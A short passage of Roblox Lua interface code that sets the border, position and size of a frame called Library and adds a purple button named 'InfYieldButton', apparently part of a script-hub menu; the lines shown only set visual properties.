		Library.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Library.BorderSizePixel = 2
		Library.Position = UDim2.new(0.499215066, 0, 0.264925361, 0)
		Library.Size = UDim2.new(0, 324, 0, 377)
	
		InfYieldButton.Name = "InfYieldButton"
		InfYieldButton.Parent = Library
		InfYieldButton.BackgroundColor3 = Color3.fromRGB(85, 0, 255)
		InfYieldButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
